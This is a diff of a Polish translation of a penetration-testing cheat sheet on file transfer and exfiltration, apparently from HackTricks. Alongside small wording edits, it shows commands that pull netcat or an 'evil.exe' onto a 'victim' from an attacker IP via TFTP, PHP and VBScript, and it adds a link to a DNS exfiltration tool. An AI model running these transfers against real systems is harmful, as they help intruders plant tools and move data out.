@@ -42,10 +42,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Przesyłanie plików
+### Upload files
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer drukujący GET i POST (także nagłówki)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 - Moduł Pythona [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -234,7 +234,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Domyślnie w XP i 2003 (w innych musi być wyraźnie dodany podczas instalacji)
+Domyślnie w XP i 2003 (w innych systemach musi być wyraźnie dodany podczas instalacji)
 
 W Kali, **uruchom serwer TFTP**:
 ```bash
@@ -248,13 +248,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-W **victim** połącz się z serwerem Kali:
+W **victim**, połącz się z serwerem Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Pobierz plik z onelinerem PHP:
+Pobierz plik z PHP onelinerem:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -296,7 +296,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` nie tylko umożliwia inspekcję plików binarnych, ale także ma **zdolność do ich odbudowy z hex**. Oznacza to, że podając hex pliku binarnego, `debug.exe` może wygenerować plik binarny. Jednak ważne jest, aby zauważyć, że debug.exe ma **ograniczenie w składaniu plików do 64 kb**.
+Program `debug.exe` nie tylko umożliwia inspekcję plików binarnych, ale także ma **zdolność do odbudowywania ich z hex**. Oznacza to, że podając hex pliku binarnego, `debug.exe` może wygenerować plik binarny. Ważne jest jednak, aby zauważyć, że debug.exe ma **ograniczenie w składaniu plików do 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -304,6 +304,10 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 Następnie skopiuj i wklej tekst do powłoki systemu Windows, a plik o nazwie nc.exe zostanie utworzony.
 
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
